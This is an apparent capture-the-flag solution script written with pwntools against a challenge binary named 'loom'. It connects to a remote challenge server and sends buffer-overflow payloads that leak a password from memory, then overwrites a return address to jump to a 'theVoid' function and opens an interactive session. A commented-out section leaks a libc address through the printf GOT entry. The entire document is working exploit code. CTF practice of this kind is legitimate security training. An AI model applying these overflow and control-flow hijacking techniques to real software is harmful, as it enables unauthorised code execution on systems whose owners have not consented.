#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("./loom_patched", checksec=False)
libc = ELF("./libc.so.6",checksec=False)


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('0.cloud.chals.io', 33616)
    return r

def loomRoom(choice, payload):
    r.sendline(b'1')
    r.sendline(b'1')
    r.sendline(payload)

def fatesRoom(choice, password):
    r.sendline(b'3')
    r.sendline(password)
    r.sendline(str(choice))

r = conn()
# input()
#### leak libc
# payload = b"A"*0x118
# payload += p64(exe.got['printf']) 
# loomRoom(1, payload)
# r.sendline(b'2')
# r.recvuntil(b'looks ancient : \n\n')
# libc_leak = u64(r.recv(6).ljust(8,b'\0'))
# # libc.address = libc_leak -0x60770
# libc.address = libc_leak- libc.sym['printf']
# log.info("LIBC BASE: "+hex(libc.address))
# #leak password
payload = b"A"*0x118
payload += p64(0x40232a) 
loomRoom(1, payload)
r.sendline(b'2')
r.recvuntil(b'looks ancient : \n\n')
pwd = r.recvline().strip()  
log.info("PASSWORD: "+ pwd.decode())
payload = b"A"*0x98+p64(exe.sym['theVoid'])
loomRoom(1, payload)
payload = p64(exe.sym['theVoid'])
fatesRoom(1, pwd)
# r.sendline(payload)
r.interactive()
